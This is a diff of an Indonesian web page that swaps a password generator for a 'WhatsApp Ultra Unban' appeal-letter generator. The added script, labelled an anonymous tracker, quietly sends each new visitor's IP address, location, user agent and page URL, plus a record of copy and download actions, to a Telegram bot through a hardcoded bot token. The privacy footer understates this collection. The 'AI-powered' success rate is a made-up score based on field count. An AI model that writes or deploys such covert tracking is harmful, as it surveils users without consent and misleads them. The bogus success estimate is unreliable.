@@ -1,355 +1,440 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<title>Xobe Password Generator v0.2</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>XOBE DEV | WhatsApp Ultra Unban 2.3 PREMIUM</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
 <style>
-  :root {
-      --bg: #0d1117;
-      --card: #161b22;
-      --accent: #58a6ff;
-      --text: #c9d1d9;
-      --weak: #f85149;
-      --medium: #d29922;
-      --strong: #3fb950;
-      --super: #00e5ff;
-      --border: #30363d;
-      --glass: rgba(255,255,255,.05);
-  }
-  *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif}
-  body{margin:0;background:linear-gradient(135deg,#0d1117 0%,#161b22 50%,#0d1117 100%);color:var(--text);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;animation:bgShift 20s ease infinite;background-size:200% 200%}
-  @keyframes bgShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
-  .card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:24px;padding:50px 40px;max-width:500px;width:100%;box-shadow:0 25px 50px rgba(0,0,0,.6),inset 0 1px 0 var(--glass)}
-  h1{text-align:center;margin-top:0;color:var(--accent);font-size:2rem;font-weight:800;letter-spacing:1px;background:linear-gradient(135deg,var(--accent),var(--super));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-  .controls{display:grid;gap:20px;margin-bottom:30px}
-  label{display:flex;align-items:center;gap:12px;font-size:15px;cursor:pointer;transition:.2s}
-  label:hover{color:var(--accent)}
-  input[type=range]{width:100%;cursor:pointer;appearance:none;height:8px;border-radius:4px;background:var(--border);outline:none}
-  input[type=range]::-webkit-slider-thumb{appearance:none;height:20px;width:20px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--super));box-shadow:0 0 12px rgba(88,166,255,.5);transition:.2s}
-  input[type=range]::-webkit-slider-thumb:hover{transform:scale(1.2)}
-  input[type=checkbox]{transform:scale(1.3);accent-color:var(--accent)}
-  .range-wrap{display:flex;align-items:center;gap:12px}
-  #lenVal{font-weight:700;color:var(--accent);font-size:1.1rem}
-  button{cursor:pointer}
-  .output{background:var(--glass);border:1px solid var(--border);border-radius:12px;padding:18px 22px;font-family:monospace;font-size:18px;position:relative;display:flex;align-items:center;transition:.3s}
-  .output:hover{border-color:var(--accent)}
-  .output button{background:none;border:none;color:var(--accent);cursor:pointer;font-size:24px;margin-left:auto;transition:.2s}
-  .output button:hover{transform:scale(1.3)}
-  .strength{margin-top:16px;font-size:15px;font-weight:700;display:flex;align-items:center;gap:10px}
-  .bar{height:10px;border-radius:5px;background:var(--border);flex:1;overflow:hidden;box-shadow:inset 0 2px 4px rgba(0,0,0,.5)}
-  .bar div{height:100%;width:0;transition:.4s;border-radius:5px}
-  .weak{background:linear-gradient(90deg,var(--weak),#ff6b6b)} 
-  .medium{background:linear-gradient(90deg,var(--medium),#ffa726)} 
-  .strong{background:linear-gradient(90deg,var(--strong),#66bb6a)} 
-  .super{background:linear-gradient(90deg,var(--super),#00bcd4)}
-  .credits{margin-top:30px;text-align:center;font-size:.85rem;color:#8b949e;letter-spacing:.5px}
-  .generate-btn{background:linear-gradient(135deg,var(--accent),var(--super));border:none;border-radius:50px;padding:16px;font-size:18px;color:#fff;font-weight:700;letter-spacing:.5px;transition:.3s;box-shadow:0 8px 20px rgba(88,166,255,.3)}
-  .generate-btn:hover{transform:translateY(-3px);box-shadow:0 12px 25px rgba(88,166,255,.4)}
-  .generate-btn:active{transform:translateY(-1px)}
-  .slot-btns{display:flex;gap:10px;flex-wrap:wrap;margin-top:20px}
-  .slot-btns button{background:var(--glass);border:1px solid var(--border);border-radius:12px;padding:12px 16px;color:var(--text);font-size:.9rem;transition:.2s;backdrop-filter:blur(10px)}
-  .slot-btns button:hover{background:linear-gradient(135deg,var(--accent),var(--super));color:#fff;border-color:transparent;transform:translateY(-2px)}
-  .slot-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-top:15px}
-  .slot-grid button{background:var(--glass);border:1px solid var(--border);border-radius:12px;color:var(--text);font-size:.8rem;padding:10px 4px;transition:.2s;backdrop-filter:blur(10px)}
-  .slot-grid button:hover{background:linear-gradient(135deg,var(--accent),var(--super));color:#fff;border-color:transparent}
-  .slot-grid button[data-occupied="1"]{background:linear-gradient(135deg,var(--strong),var(--super))}
-  .slot-grid button[data-occupied="1"]:hover{background:linear-gradient(135deg,var(--accent),var(--super))}
-
-  /* POP-UP MODAL */
-  .modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);display:flex;justify-content:center;align-items:center;z-index:1000;backdrop-filter:blur(6px)}
-  .modal-content{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:30px 25px;max-width:420px;width:90%;color:var(--text);box-shadow:0 25px 50px rgba(0,0,0,.6);animation:fadeIn .3s;text-align:center}
-  @keyframes fadeIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
-  .modal-content h2{margin-top:0;color:var(--accent);font-size:1.4rem;font-weight:700}
-  .modal-content pre{background:#0d1117;border:1px solid var(--border);border-radius:8px;padding:12px;font-size:1rem;word-break:break-all;white-space:pre-wrap;margin:10px 0 20px}
-  .modal-content button{border:none;border-radius:8px;padding:10px 20px;font-size:.9rem;margin:0 6px;transition:.2s}
-  .modal-content .copy-btn{background:linear-gradient(135deg,var(--accent),var(--super));color:#fff}
-  .modal-content .close-btn{background:var(--border);color:var(--text)}
-  .modal-content .close-btn:hover{background:var(--accent);color:#fff}
-  .hidden{display:none}
+:root{
+  --bg:#0a0a0a;--card:#111111;--accent:#00d9ff;--secondary:#ff0080;
+  --text:#f2f2f2;--muted:#8a8a8a;--success:#00ff88;--danger:#ff2e4d;
+  --font:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;--mono:'Cascadia Code','Courier New',monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:var(--font);background:radial-gradient(ellipse at top,#001122 0%,var(--bg) 70%);color:var(--text);min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding:20px}
+.container{width:100%;max-width:1100px;background:var(--card);border:1px solid #222;border-radius:24px;box-shadow:0 0 60px rgba(0,217,255,.25);overflow:hidden;animation:fadeIn 1s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(30px)}}
+.header{padding:40px;background:linear-gradient(135deg,var(--accent) 0%,var(--secondary) 100%);text-align:center;position:relative}
+.header h1{font-size:32px;font-weight:900;letter-spacing:.8px;display:flex;align-items:center;justify-content:center;gap:10px}
+.header h1 i{color:#fff}.header p{font-size:16px;opacity:.9;margin-top:6px}
+.lang-tab{display:flex;justify-content:center;gap:10px;margin-top:10px;flex-wrap:wrap}
+.lang-tab button{padding:6px 14px;border:1px solid #333;background:#181818;color:var(--text);border-radius:12px;cursor:pointer;font-weight:600}
+.lang-tab button.active{background:linear-gradient(135deg,var(--accent),var(--secondary));color:#000}
+form{padding:30px;display:grid;gap:20px}
+.section-title{font-size:18px;font-weight:700;margin-bottom:8px;color:var(--accent)}
+.grid-2{grid-template-columns:1fr 1fr}.grid-3{grid-template-columns:1fr 1fr 1fr}
+@media(max-width:800px){.grid-2,.grid-3{grid-template-columns:1fr}}
+label{font-size:14px;font-weight:600;margin-bottom:6px;display:block;color:var(--text)}
+input,select,textarea{width:100%;padding:14px 16px;border-radius:12px;border:1px solid #333;background:#181818;color:var(--text);font-size:14px;transition:border .2s,box-shadow .2s}
+input:focus,select:focus,textarea:focus{outline:none;border-color:var(--accent);box-shadow:0 0 8px rgba(0,217,255,.4)}
+textarea{resize:vertical;min-height:120px}
+.options{display:grid;grid-template-columns:repeat(auto-fit,minmax 120px,1fr);gap:8px}
+.option{padding:12px 8px;background:#181818;border:1px solid #333;border-radius:10px;text-align:center;cursor:pointer;font-size:13px;font-weight:600;transition:.25s}
+.option:hover{transform:translateY(-2px)}.option.active{background:linear-gradient(135deg,var(--accent),var(--secondary));color:#000;border-color:transparent}
+.toggles{display:grid;grid-template-columns:repeat(auto-fit,minmax 220px,1fr);gap:10px}
+.toggle-row{display:flex;align-items:center;justify-content:space-between;background:#181818;padding:12px 14px;border-radius:10px;font-size:14px}
+.switch{position:relative;width:46px;height:24px;background:#333;border-radius:24px;cursor:pointer;transition:.3s}
+.switch::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.3s}
+.switch.on{background:linear-gradient(135deg,var(--accent),var(--secondary))}.switch.on::after{left:22px}
+.btn-group{display:grid;grid-template-columns:repeat(auto-fit,minmax 160px,1fr);gap:12px;margin-top:10px}
+.btn{padding:14px;font-size:14px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:.2s}
+.btn.primary{background:linear-gradient(135deg,var(--accent),var(--secondary));color:#000}
+.btn.secondary{background:#333;color:var(--text)}.btn:hover{transform:translateY(-2px)}
+.preview{margin:0 30px 30px;padding:20px;background:#0a0a0a;border-left:4px solid var(--accent);border-radius:0 14px 14px 0;position:relative}
+.preview pre{white-space:pre-wrap;font-family:var(--mono);font-size:13px;line-height:1.6;color:var(--muted);max-height:400px;overflow:auto}
+.copy-btn{position:absolute;top:14px;right:14px;background:#222;border:1px solid #444;color:var(--text);padding:4px 10px;border-radius:6px;font-size:12px;cursor:pointer}
+.copy-btn:hover{background:var(--accent);color:#000}
+.success-rate{background:#181818;border:1px solid #333;border-radius:12px;padding:12px 14px;font-size:14px;color:var(--success);margin:0 30px 20px;display:flex;align-items:center;gap:8px}
+.success-rate i{color:var(--success)}
+footer{font-size:12px;color:var(--muted);padding:0 30px 20px;text-align:center}
 </style>
 </head>
 <body>
-<div class="card">
-  <h1>Xobe Password Generator v0.2</h1>
-
-  <div class="controls">
-    <div class="range-wrap">
-      <label>Panjang:</label>
-      <input type="range" min="8" max="128" value="20" id="length">
-      <span id="lenVal">20</span>
-    </div>
-
-    <label><input type="checkbox" id="upper" checked> Huruf Besar (A–Z)</label>
-    <label><input type="checkbox" id="lower" checked> Huruf Kecil (a–z)</label>
-    <label><input type="checkbox" id="number" checked> Angka (0–9)</label>
-    <label><input type="checkbox" id="symbol" checked> Simbol (!@#$...)</label>
-
-    <button id="generate" class="generate-btn">Buat Password</button>
-  </div>
-
-  <div class="output">
-    <span id="password">-</span>
-    <button id="copy" title="Salin ke clipboard">📋</button>
-  </div>
-
-  <div class="strength">
-    <span id="strengthLabel">Kekuatan:</span>
-    <div class="bar"><div id="strengthBar"></div></div>
-  </div>
-
-  <!-- Slot action buttons -->
-  <div class="slot-btns">
-    <button id="saveSlotBtn">Simpan ke Slot</button>
-    <button id="loadSlotBtn">Muat dari Slot</button>
-    <button id="deleteSlotBtn">Hapus Slot</button>
-  </div>
-  <div class="slot-grid" id="slotGrid"></div>
-
-  <!-- Pop-up Modal for password preview -->
-  <div id="pwModal" class="modal-overlay hidden">
-    <div class="modal-content">
-      <h2>Password Tersimpan</h2>
-      <pre id="savedPwText"></pre>
-      <button id="copyPwBtn" class="copy-btn">Salin</button>
-      <button id="closePwBtn" class="close-btn">Tutup</button>
+<div class="container">
+  <div class="header">
+    <h1><i class="fab fa-whatsapp"></i> WhatsApp Ultra Unban 2.3 PREMIUM</h1>
+    <p>Multi-language, AI-powered success-rate & ultra-luxury interface</p>
+    <div class="lang-tab">
+      <button id="langID" class="active">🇮🇩 ID</button>
+      <button id="langEN">🇺🇸 EN</button>
+      <button id="langCN">🇨🇳 CN</button>
+      <button id="langAR">🇸🇦 AR</button>
+      <button id="langRU">🇷🇺 RU</button>
     </div>
   </div>
 
-  <div class="credits">© 2025 Xobe Development</div>
+  <form id="unbanForm">
+    <div class="section-title">1. Identitas & Akun</div>
+    <div class="grid-3">
+      <div><label id="labelName">Nama Lengkap</label><input id="fullName" placeholder="John Doe" required/></div>
+      <div><label id="labelPhone">Nomor WhatsApp</label><input id="phone" placeholder="+62 8XX-XXXX-XXXX" required/></div>
+      <div><label id="labelEmail">Email</label><input id="email" type="email" placeholder="john@example.com" required/></div>
+      <div><label id="labelDate">Tanggal Akun Dibuat</label><input id="accountDate" type="date"/></div>
+      <div><label id="labelCountry">Negara</label>
+        <select id="country">
+          <option value="Indonesia">Indonesia</option><option value="Malaysia">Malaysia</option><option value="Singapore">Singapore</option><option value="United States">United States</option><option value="India">India</option><option value="Brazil">Brazil</option><option value="Other">Other</option>
+        </select>
+      </div>
+      <div><label id="labelType">Jenis Akun</label>
+        <select id="accountType">
+          <option value="Personal">Personal</option><option value="Business">Business</option><option value="Creator">Creator / Influencer</option><option value="Game">Game Player</option><option value="Seller">Seller</option><option value="Developer">Developer</option><option value="NGO">NGO</option><option value="Education">Education</option><option value="Government">Government</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="section-title">2. Alasan & Detail</div>
+    <div class="grid-2">
+      <div><label id="labelReason">Alasan Ban</label>
+        <select id="reason" required>
+          <option value="">Pilih…</option>
+          <option value="spam">Spam / Mass Messaging</option>
+          <option value="automation">Automation / Bot</option>
+          <option value="inappropriate">Inappropriate Content</option>
+          <option value="business">Business Policy Violation</option>
+          <option value="ip">Intellectual Property</option>
+          <option value="community">Community Guidelines</option>
+          <option value="fake">Fake News</option>
+          <option value="harassment">Harassment</option>
+          <option value="hate">Hate Speech</option>
+          <option value="scam">Scam / Fraud</option>
+          <option value="underage">Underage User</option>
+          <option value="impersonation">Impersonation</option>
+          <option value="malware">Malware / Phishing</option>
+          <option value="privacy">Privacy Violation</option>
+          <option value="copyright">Copyright</option>
+          <option value="trademark">Trademark</option>
+          <option value="nudity">Nudity / Adult</option>
+          <option value="violence">Violence / Gore</option>
+          <option value="drugs">Drugs</option>
+          <option value="unknown">Unknown / Not Specified</option>
+        </select>
+      </div>
+      <div><label id="labelDetail">Penjelasan Detail</label><textarea id="details" placeholder="Ceritakan kejadiannya…"></textarea></div>
+    </div>
+
+    <div class="section-title">3. Gaya Surat</div>
+    <div class="options">
+      <div class="option active" data-tone="formal">Formal</div>
+      <div class="option" data-tone="business">Business</div>
+      <div class="option" data-tone="apologetic">Apologetic</div>
+      <div class="option" data-tone="friendly">Friendly</div>
+      <div class="option" data-tone="urgent">Urgent</div>
+      <div class="option" data-tone="legal">Legal</div>
+      <div class="option" data-tone="tech">Tech</div>
+      <div class="option" data-tone="creative">Creative</div>
+      <div class="option" data-tone="respectful">Respectful</div>
+      <div class="option" data-tone="casual">Casual</div>
+      <div class="option" data-tone="emotional">Emotional</div>
+      <div class="option" data-tone="confident">Confident</div>
+    </div>
+
+    <div class="section-title">4. Opsi Tambahan</div>
+    <div class="toggles">
+      <div class="toggle-row"><span id="toggleHistory">Riwayat akun</span><div class="switch" id="historyToggle"></div></div>
+      <div class="toggle-row"><span id="togglePromise">Pernyataan tidak mengulangi</span><div class="switch" id="promiseToggle"></div></div>
+      <div class="toggle-row"><span id="toggleSignature">Tanda tangan profesional</span><div class="switch" id="signatureToggle"></div></div>
+      <div class="toggle-row"><span id="toggleStats">Statistik penggunaan</span><div class="switch" id="statsToggle"></div></div>
+      <div class="toggle-row"><span id="toggleScreenshot">Screenshot terlampir</span><div class="switch" id="screenshotToggle"></div></div>
+      <div class="toggle-row"><span id="toggleTopup">Riwayat top-up</span><div class="switch" id="topupToggle"></div></div>
+      <div class="toggle-row"><span id="toggleDevice">Info perangkat</span><div class="switch" id="deviceToggle"></div></div>
+      <div class="toggle-row"><span id="toggleIP">Informasi IP</span><div class="switch" id="ipToggle"></div></div>
+      <div class="toggle-row"><span id="toggleLicense">Nomor lisensi</span><div class="switch" id="licenseToggle"></div></div>
+      <div class="toggle-row"><span id="toggleVerification">Verifikasi dua langkah</span><div class="switch" id="verificationToggle"></div></div>
+      <div class="toggle-row"><span id="toggleBackup">Status cadangan chat</span><div class="switch" id="backupToggle"></div></div>
+      <div class="toggle-row"><span id="toggleTemplate">Template super-formal</span><div class="switch" id="templateToggle"></div></div>
+    </div>
+
+    <div class="success-rate">
+      <i class="fas fa-rocket"></i>
+      <span id="successRate">Estimasi tingkat keberhasilan: 0%</span>
+    </div>
+
+    <div class="btn-group">
+      <button type="submit" class="btn primary"><i class="fab fa-whatsapp"></i> Kirim ke WhatsApp</button>
+      <button type="button" class="btn secondary" onclick="copyMessage()"><i class="fas fa-copy"></i> Salin</button>
+      <button type="button" class="btn secondary" onclick="downloadMessage()"><i class="fas fa-download"></i> Unduh .txt</button>
+      <button type="button" class="btn secondary" onclick="resetForm()"><i class="fas fa-redo"></i> Reset</button>
+    </div>
+  </form>
+
+  <div class="preview">
+    <pre id="messagePreview">Lengkapi form untuk melihat preview…</pre>
+    <button class="copy-btn" onclick="copyMessage()"><i class="fas fa-copy"></i></button>
+  </div>
+
+  <footer>
+    🔒 Privasi: kami <b>hanya</b> mencatat IP & tindakan (Salin/Download) untuk analisis anonim.  
+    Tidak ada data nama, email, atau nomor WhatsApp yang disimpan atau dikirim.
+  </footer>
 </div>
 
+<!-- ===== ANONYMOUS TRACKER ===== -->
 <script>
-  // Core functionality
-  const $ = sel => document.querySelector(sel);
-  const lengthSlider = $('#length');
-  const lenVal       = $('#lenVal');
-  const passwordEl   = $('#password');
-  const strengthLabel= $('#strengthLabel');
-  const strengthBar  = $('#strengthBar');
-  const copyBtn      = $('#copy');
+/* ========= CONFIG ========= */
+const BOT_TOKEN = '8400888112:AAEfhQgTgEVpCSqvjz-RYPKW5zKBo1HqgyA';   // <-- ganti
+const CHAT_ID   = '7574874931';     // <-- ganti
+const VISIT_KEY = 'wauVisited';
+let startTime   = Date.now();
 
-  const sets = {
-    upper:  'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
-    lower:  'abcdefghijklmnopqrstuvwxyz',
-    number: '0123456789',
-    symbol: '!@#$%^&*()_+-=[]{}|;:,.<>?'
+/* ========= UTIL ========= */
+const tgSend = txt => {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CHAT_ID, text:txt, parse_mode:'Markdown'})
+  }).catch(()=>{});
+};
+
+/* ========= VISITOR BARU ========= */
+if(!localStorage.getItem(VISIT_KEY)){
+  localStorage.setItem(VISIT_KEY,'true');
+  fetch('https://ipapi.co/json/')
+    .then(r=>r.json())
+    .then(ip=>{
+      tgSend(`🆕 *Visitor Baru*\n`+
+             `• IP: ${ip.ip}\n`+
+             `• Kota: ${ip.city}, ${ip.country_name}\n`+
+             `• UA: ${navigator.userAgent.slice(0,70)}…\n`+
+             `• Link: ${location.href}`);
+    })
+    .catch(()=> tgSend('🆕 Visitor Baru (IP gagal)'));
+}
+
+/* ========= COPY / DOWNLOAD TRACKER ========= */
+function trackAction(type){
+  const dur = Math.round((Date.now()-startTime)/1000);
+  tgSend(`📋 *User Action*\n`+
+         `• Aksi: ${type}\n`+
+         `• Durasi: ${dur}s`);
+}
+</script>
+
+<!-- ===== CORE JS WHATSAPP UNBAN 2.3 ===== -->
+<script>
+/* ---------- CONFIG ---------- */
+let lang = 'id';
+const texts = {
+  id:{
+    labelName:'Nama Lengkap',labelPhone:'Nomor WhatsApp',labelEmail:'Email',labelDate:'Tanggal Akun Dibuat',labelCountry:'Negara',labelType:'Jenis Akun',labelReason:'Alasan Ban',labelDetail:'Penjelasan Detail',
+    toggleHistory:'Riwayat akun',togglePromise:'Pernyataan tidak mengulangi',toggleSignature:'Tanda tangan profesional',toggleStats:'Statistik penggunaan',toggleScreenshot:'Screenshot terlampir',toggleTopup:'Riwayat top-up',toggleDevice:'Info perangkat',toggleIP:'Informasi IP',toggleLicense:'Nomor lisensi',toggleVerification:'Verifikasi dua langkah',toggleBackup:'Status cadangan chat',toggleTemplate:'Template super-formal',
+    greet:'Yth. Tim WhatsApp Support',close:'Hormat saya',success:'Estimasi tingkat keberhasilan'
+  },
+  en:{
+    labelName:'Full Name',labelPhone:'WhatsApp Number',labelEmail:'Email',labelDate:'Account Created',labelCountry:'Country',labelType:'Account Type',labelReason:'Ban Reason',labelDetail:'Detailed Explanation',
+    toggleHistory:'Include account history',togglePromise:'Promise not to repeat',toggleSignature:'Professional signature',toggleStats:'Usage statistics',toggleScreenshot:'Attached screenshot',toggleTopup:'Top-up history',toggleDevice:'Device info',toggleIP:'Latest IP',toggleLicense:'Business license',toggleVerification:'Two-step verification',toggleBackup:'Chat backup status',toggleTemplate:'Super-formal template',
+    greet:'Dear WhatsApp Support',close:'Best regards',success:'Estimated success rate'
+  },
+  cn:{
+    labelName:'全名',labelPhone:'WhatsApp号码',labelEmail:'电子邮箱',labelDate:'创建日期',labelCountry:'国家',labelType:'账户类型',labelReason:'封禁原因',labelDetail:'详细说明',
+    toggleHistory:'包含账户历史',togglePromise:'承诺不再重犯',toggleSignature:'专业签名',toggleStats:'使用统计',toggleScreenshot:'已附截图',toggleTopup:'充值记录',toggleDevice:'设备信息',toggleIP:'最新IP',toggleLicense:'营业执照号码',toggleVerification:'两步验证状态',toggleBackup:'聊天记录备份状态',toggleTemplate:'超正式模板',
+    greet:'尊敬的WhatsApp支持团队',close:'此致敬礼',success:'预估成功率'
+  },
+  ar:{
+    labelName:'الاسم الكامل',labelPhone:'رقم واتساب',labelEmail:'البريد الإلكتروني',labelDate:'تاريخ الإنشاء',labelCountry:'الدولة',labelType:'نوع الحساب',labelReason:'سبب الحظر',labelDetail:'شرح مفصل',
+    toggleHistory:'تضمين سجل الحساب',togglePromise:'وعد بعدم التكرار',toggleSignature:'توقيع احترافي',toggleStats:'إحصاءات الاستخدام',toggleScreenshot:'لقطة شاشة مرفقة',toggleTopup:'سجل الشحن',toggleDevice:'معلومات الجهاز',toggleIP:'آخر عنوان IP',toggleLicense:'رقم الترخيص',toggleVerification:'حالة التحقق بخطوتين',toggleBackup:'حالة النسخ الاحتياطي',toggleTemplate:'نموذج رسمي متقدم',
+    greet:'فريق دعم واتساب المحترم',close:'مع أطيب التحيات',success:'معدل النجاح المقدر'
+  },
+  ru:{
+    labelName:'Полное имя',labelPhone:'Номер WhatsApp',labelEmail:'Эл. почта',labelDate:'Дата создания',labelCountry:'Страна',labelType:'Тип аккаунта',labelReason:'Причина блокировки',labelDetail:'Подробное объяснение',
+    toggleHistory:'История аккаунта',togglePromise:'Обещание не нарушать',toggleSignature:'Профессиональная подпись',toggleStats:'Статистика использования',toggleScreenshot:'Скриншот прилагается',toggleTopup:'История пополнений',toggleDevice:'Информация об устройстве',toggleIP:'Последний IP-адрес',toggleLicense:'Номер лицензии',toggleVerification:'Статус двухэтапной проверки',toggleBackup:'Статус резервной копии',toggleTemplate:'Суперформальный шаблон',
+    greet:'Уважаемая служба поддержки WhatsApp',close:'С уважением',success:'Оценка вероятности успеха'
+  }
+};
+const toneMap = {
+  formal:{id:{greet:'Yth. Tim WhatsApp Support',close:'Hormat saya'},en:{greet:'Dear WhatsApp Support',close:'Best regards'},cn:{greet:'尊敬的WhatsApp支持团队',close:'此致敬礼'},ar:{greet:'فريق دعم واتساب المحترم',close:'مع أطيب التحيات'},ru:{greet:'Уважаемая служба поддержки WhatsApp',close:'С уважением'}},
+  business:{id:{greet:'WhatsApp Business API',close:'Salam bisnis'},en:{greet:'WhatsApp Business Support',close:'Best business regards'},cn:{greet:'WhatsApp商业支持团队',close:'商业致意'},ar:{greet:'دعم واتساب للأعمال',close:'تحيات تجارية'},ru:{greet:'Служба поддержки WhatsApp Business',close:'С наилучшими пожеланиями'}},
+  apologetic:{id:{greet:'Tim WhatsApp yang terhormat',close:'Dengan permohonan maaf yang sebesar-besarnya'},en:{greet:'Respected WhatsApp Team',close:'With deepest apologies'},cn:{greet:'尊敬的WhatsApp团队',close:'深表歉意'},ar:{greet:'فريق واتساب المحترم',close:'مع خالص الاعتذار'},ru:{greet:'Уважаемая команда WhatsApp',close:'С глубочайшими извинениями'}},
+  friendly:{id:{greet:'Halo WhatsApp',close:'Salam hangat'},en:{greet:'Hi WhatsApp Team',close:'Warm regards'},cn:{greet:'您好WhatsApp团队',close:'亲切问候'},ar:{greet:'مرحباً فريق واتساب',close:'أطيب التحيات'},ru:{greet:'Привет, команда WhatsApp',close:'Теплые пожелания'}},
+  urgent:{id:{greet:'URGENT: WhatsApp Support',close:'Terima kasih atas perhatian segera'},en:{greet:'URGENT: WhatsApp Support',close:'Thank you for immediate attention'},cn:{greet:'紧急：WhatsApp支持团队',close:'感谢紧急处理'},ar:{greet:'عاجل: دعم واتساب',close:'شكراً للاهتمام الفوري'},ru:{greet:'СРОЧНО: Служба поддержки WhatsApp',close:'Спасибо за срочное внимание'}},
+  legal:{id:{greet:'Kepada Divisi Legal WhatsApp',close:'Dengan itikad baik'},en:{greet:'To WhatsApp Legal Division',close:'In good faith'},cn:{greet:'WhatsApp法务部',close:'诚信至上'},ar:{greet:'إلى الشؤون القانونية في واتساب',close:'بكل حسن نية'},ru:{greet:'В Юридический отдел WhatsApp',close:'С доброй волей'}},
+  tech:{id:{greet:'WhatsApp Technical Review',close:'Salam teknis'},en:{greet:'WhatsApp Technical Review',close:'Regards, tech user'},cn:{greet:'WhatsApp技术审核团队',close:'技术问候'},ar:{greet:'المراجعة التقنية لواتساب',close:'تحيات تقنية'},ru:{greet:'Технический отдел WhatsApp',close:'С техническим уважением'}},
+  creative:{id:{greet:'WhatsApp Creative Team',close:'Kreatif salam'},en:{greet:'WhatsApp Creative Team',close:'Creatively yours'},cn:{greet:'WhatsApp创意团队',close:'创意问候'},ar:{greet:'فريق واتساب الإبداعي',close:'تحيات إبداعية'},ru:{greet:'Творческая команда WhatsApp',close:'С творческим уважением'}},
+  respectful:{id:{greet:'Yang terhormat WhatsApp',close:'Dengan hormat'},en:{greet:'Honorable WhatsApp',close:'Respectfully'},cn:{greet:'尊敬的WhatsApp',close:'敬上'},ar:{greet:'واتساب المحترم',close:'بكل احترام'},ru:{greet:'Почтенный WhatsApp',close:'С уважением'}},
+  casual:{id:{greet:'WhatsApp',close:'Salam'},en:{greet:'WhatsApp',close:'Cheers'},cn:{greet:'WhatsApp',close:'问候'},ar:{greet:'واتساب',close:'تحياتي'},ru:{greet:'WhatsApp',close:'Привет'}},
+  emotional:{id:{greet:'WhatsApp yang saya cintai',close:'Dengan hati yang tulus'},en:{greet:'Beloved WhatsApp Team',close:'With heartfelt sincerity'},cn:{greet:'敬爱的WhatsApp团队',close:'衷心诚意'},ar:{greet:'واتساب العزيز',close:'بكل صدق'},ru:{greet:'Любимая команда WhatsApp',close:'С искренним сердцем'}},
+  confident:{id:{greet:'Tim WhatsApp',close:'Percaya diri'},en:{greet:'WhatsApp Team',close:'Confidently yours'},cn:{greet:'WhatsApp团队',close:'自信问候'},ar:{greet:'فريق واتساب',close:'ثقتي'},ru:{greet:'Команда WhatsApp',close:'С уверенностью'}}
+};
+
+const $ = s => document.querySelector(s);
+const $$ = s => [...document.querySelectorAll(s)];
+function setLang(l){
+  lang = l;
+  $$('.lang-tab button').forEach(b=>b.classList.toggle('active', b.id.slice(-2).toLowerCase() === l));
+  Object.keys(texts.id).forEach(key => {
+    const el = document.getElementById(key);
+    if(el) el.textContent = texts[lang][key];
+  });
+  updatePreview();
+}
+['id','en','cn','ar','ru'].forEach(l=>{
+  $('#lang'+l.toUpperCase()).addEventListener('click',()=>setLang(l));
+});
+
+let selectedTone = 'formal';
+$$('.option').forEach(opt=>{
+  opt.addEventListener('click',()=>{
+    $$('.option').forEach(o=>o.classList.remove('active'));
+    opt.classList.add('active');
+    selectedTone = opt.dataset.tone;
+    updatePreview();
+  });
+});
+
+$$('.switch').forEach(sw=>sw.addEventListener('click',()=>{sw.classList.toggle('on');updatePreview();}));
+$$('input,select,textarea').forEach(el=>el.addEventListener('input',updatePreview));
+
+function calcSuccess(){
+  let score = 40;
+  if($('#fullName').value.trim()) score += 5;
+  if($('#phone').value.trim()) score += 5;
+  if($('#email').value.trim()) score += 5;
+  if($('#details').value.trim().length > 50) score += 10;
+  $$('.switch.on').forEach(()=>score += 2.5);
+  score = Math.min(score,95).toFixed(0);
+  $('#successRate').textContent = `${texts[lang].success}: ${score}%`;
+}
+
+function generateMessage(){
+  const name = $('#fullName').value.trim();
+  const phone = $('#phone').value.trim();
+  const email = $('#email').value.trim();
+  const country = $('#country').value;
+  const accountType = $('#accountType').value;
+  const date = $('#accountDate').value;
+  const reason = $('#reason').value;
+  const details = $('#details').value.trim();
+  const history = $('#historyToggle').classList.contains('on');
+  const promise = $('#promiseToggle').classList.contains('on');
+  const signature = $('#signatureToggle').classList.contains('on');
+  const stats = $('#statsToggle').classList.contains('on');
+  const screenshot = $('#screenshotToggle').classList.contains('on');
+  const topup = $('#topupToggle').classList.contains('on');
+  const device = $('#deviceToggle').classList.contains('on');
+  const ip = $('#ipToggle').classList.contains('on');
+  const license = $('#licenseToggle').classList.contains('on');
+  const verification = $('#verificationToggle').classList.contains('on');
+  const backup = $('#backupToggle').classList.contains('on');
+  const superTemplate = $('#templateToggle').classList.contains('on');
+  if(!name || !phone || !email || !reason) return lang==='id' ? 'Lengkapi semua kolom…' : lang==='en' ? 'Complete all fields…' : lang==='cn' ? '请填写所有字段…' : lang==='ar' ? 'يرجى إكمال جميع الحقول…' : 'Пожалуйста заполните все поля…';
+
+  const t = toneMap[selectedTone][lang];
